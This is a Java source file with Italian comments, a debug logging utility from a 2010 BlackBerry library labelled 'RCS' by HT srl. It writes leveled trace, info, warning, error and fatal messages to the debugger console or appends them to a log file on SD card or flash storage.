/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Debug.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.utils;

import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;

//TODO: ottimizzare per togliere la chiamata in  Release
public class Debug {
    final static String FILE_NAME = "Debug.txt";
    final static String SD_PATH = Path.SDPath + FILE_NAME;
    final static String FLASH_PATH = Path.UserPath + FILE_NAME;

    static boolean Enabled = true;
    static public int Level = 6;

    static public boolean LOG_TO_DEBUGGER = true;
    static public boolean LOG_TO_SD = false;
    static public boolean LOG_TO_FLASH = false;

    static private AutoFlashFile fileDebug;

    String ClassName = "NONE";
    int ActualLevel = 6;

    public Debug(String className, int classLevel) {
        ClassName = className;
        ActualLevel = Math.min(classLevel, Level);

        if (LOG_TO_SD) {
            Path.CreateDirectory(Path.SDPath);
        }

        if (LOG_TO_FLASH) {
            Path.CreateDirectory(Path.UserPath);
        }

    }

    public Debug(String className) {
        this(className, DebugLevel.VERBOSE);
    }

    /*
     * prior: priorita', da 6 bassa a bassa, level
     * LEVEL = { TRACE,DEBUG,INFO,WARN, ERROR, FATAL }
     */

    private synchronized void Trace(String message, int priority) {
        if (Enabled) {
            Check.requires(priority > 0, "priority >0");

            if (priority > ActualLevel || message == null) {
                return;
            }

            if (LOG_TO_DEBUGGER) {
                logToDebugger(message, priority);

            }

            if (LOG_TO_SD || LOG_TO_FLASH) {
                logToFile(message, priority);
            }
        }
    }

    public void trace(String message) {
        // #mdebug
        if (Enabled)
            Trace("-   - " + ClassName + " | " + message, DebugLevel.VERBOSE);

        // #enddebug
    }

    public void info(String message) {
        // #mdebug
        if (Enabled)
            Trace("-INF- " + ClassName + " | " + message, DebugLevel.NOTIFY);

        // #enddebug
    }

    public void warn(String message) {
        // #mdebug
        if (Enabled)
            Trace("-WRN- " + ClassName + " | " + message, DebugLevel.LOW);

        // #enddebug
    }

    public void error(String message) {
        // #mdebug
        if (Enabled)
            Trace("#ERR# " + ClassName + " | " + message, DebugLevel.HIGH);

        // #enddebug
    }

    public void fatal(String message) {
        // #mdebug
        if (Enabled)
            Trace("#FTL# " + ClassName + " | " + message, DebugLevel.CRITICAL);

        // #enddebug
    }

    /*
     * Scrive su file il messaggio, in append.
     * Può scegliere se scrivere su /store o su /SDCard
     * Alla partenza dell'applicativo la SDCard non è visibile.
     */

    private synchronized void logToFile(String message, int priority) {
        // TODO: se è selezionata la SDCard viene richiesta la PrintRoots
        // fintanto che non compare la SDCard. Nel frattempo i messaggi vengono
        // registrati
        // in memoria.
        if (fileDebug == null) {
            if (LOG_TO_SD) {
                fileDebug = new AutoFlashFile(SD_PATH, false);
            } else {
                fileDebug = new AutoFlashFile(FLASH_PATH, false);
            }
        }

        // fileDebug.PrintRoots();

        if (!fileDebug.Exists())
            fileDebug.Create();

        boolean ret = fileDebug.Append(message + "\r\n");

        if (ret == false) {
            // TODO: procedura in caso di mancata scrittura
            logToDebugger(message, priority);
        }
    }

    private void logToDebugger(String string, int priority) {
        System.out.println(string);
    }

    public void create() {
        logToFile("CREATE", 0);
        if (fileDebug.Exists())
            fileDebug.Delete();
        fileDebug.Create();
    }

}
